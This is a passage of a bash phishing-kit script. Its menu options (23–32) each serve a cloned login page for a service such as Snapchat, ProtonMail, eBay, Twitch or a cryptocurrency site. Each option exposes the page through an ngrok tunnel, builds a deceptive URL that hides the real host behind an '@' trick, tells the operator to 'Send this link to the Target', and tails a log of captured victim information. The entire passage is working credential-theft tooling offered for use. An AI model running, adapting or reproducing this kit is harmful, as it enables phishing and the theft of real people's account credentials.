                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.flipkart.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
  

                break;
                elif [ $option = 23 ] || [ $option = 23 ]
	        then
                          cd Sites/
                          cd wordpress/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://wordpress.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                 
    

                break;
                elif [ $option = 24 ] || [ $option = 24 ]
	        then
                          cd Sites/
                          cd snapchat/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://accounts.snapchat.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
      

                break;
                elif [ $option = 25 ] || [ $option = 25 ]
	        then
                          cd Sites/
                          cd protonmail/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://protonmail.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
 

                break;
                elif [ $option = 26 ] || [ $option = 26 ]
	        then
               
                          cd Sites/
                          cd stackoverflow/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://stackoverflow.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                  
             

                break;
                elif [ $option = 27 ] || [ $option = 27 ]
	        then

                          cd Sites/
                          cd ebay/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://in.ebay.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                 
                  

                break;
                elif [ $option = 28 ] || [ $option = 28 ]
	        then
                          cd Sites/
                          cd twitch/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.twitch.tv-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt                 
     
                break;
                elif [ $option = 29 ] || [ $option = 29 ]
	        then
                          cd Sites/
                          cd ajio/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.ajio.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt            
 

                break;
                elif [ $option = 30 ] || [ $option = 30 ]
	        then
                          cd Sites/
                          cd cryptocurrency/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://google.com-login-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt              
 

                break;
                elif [ $option = 31 ] || [ $option = 31 ]
	        then
               
                          cd Sites/
                          cd mobikwik/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.mobikwik.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt   

                break;
                elif [ $option = 32 ] || [ $option = 32 ]
	        then
                          cd Sites/
                          cd pinterest/
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 25
                          clear
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          echo ""
                          echo ""
                          cat BlackMafiaLovehacker
                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                          echo ""
                          echo "" 
                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                          echo ""
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.mobikwik.com-@$link                                    
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          else
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                          fi
                           
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          echo ""
                          tail -f log.txt        

                break;
   
               

                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done
